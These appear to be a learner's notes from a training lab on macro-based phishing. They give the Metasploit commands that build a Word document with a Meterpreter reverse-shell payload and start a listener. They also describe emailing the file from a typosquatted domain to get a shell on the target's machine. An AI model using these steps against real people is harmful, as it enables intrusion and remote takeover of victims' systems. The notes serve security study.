Learning objectives
- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro
MSFT Word
	Create macros by clicking on the view menu and selecting 'macros.'
Attackers plan
	Create document with malicious macro. Once victim opens the document, the macro will execute a payload and create a reverse shell to the attackers machine. The attacker must be listen for incoming connections before sending out the document. 
	So the steps are as follows: 
		1. Create a document with a malicious macro
		2. Start listening for incoming connections on the attacker’s system
		3. Email the document and wait for the target user to open it
		4. The target user opens the document and connects to the attacker’s system
		5. Control the target user’s system
The attacker requires a reverse shell because the target's public ip is unknown. 


Attacker's System 
	On our AttackBox VM, we need to:
		Create a document w/ an embedded malicious macro 
		Listen for incoming connections (netcat?)
	Creating the Malicious Document w/ Metasploit 
		Open a new terminal window and run `msfconsole` to start the Metasploit Framework
		 `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
			`use exploit/multi/fileformat/office_word_macro` this is not an exploit; it's a module to create a document with a macro
		`set LHOST 10.10.5.140` specifies the IP address of the attacker’s system, `10.10.5.140` 
		`set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
		`show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
		 `exploit` generates a macro and embeds it in a document
		`exit` to quit and return to the terminal
		![[Pasted image 20250205130056.png]]
		![[Pasted image 20250205130333.png]]
		![[Pasted image 20250205130525.png]]
		Metasploit embedded the payload into a word document and stored it at /root/....
If we were to upload the payload into virustotall, it'll give us information about the payload, such as the type of exploit, and the attackers ip and port number. 
Listening for Incoming Connections
	- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
	- `use multi/handler` to handle incoming connections
	- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
	- `set LHOST 10.10.5.140` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
	- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
	- `show options` to confirm the values of your options
	- `exploit` starts listening for incoming connections to establish a reverse shell
	![[Pasted image 20250205131701.png]]
		We're now listening for the reverse shell on 10.10.5.140:8888
Email the malicious document 
	Target's email: marta@socmas.thm
	Attackers email: info@socnas.thm
		Attacker utilizes typosquatting to deceive target into accepting the email as if it were from the same domain (socmas.thm)
		![[Pasted image 20250205132608.png]]
		I attached the document and wrote a message suggesting they open the file asap. 
Exploitation 
	![[Pasted image 20250205133125.png]]
	Shortly after sending the email, the reverse shell opened up  and I began executing commands on Marta's machine.
	![[Pasted image 20250205133301.png]] 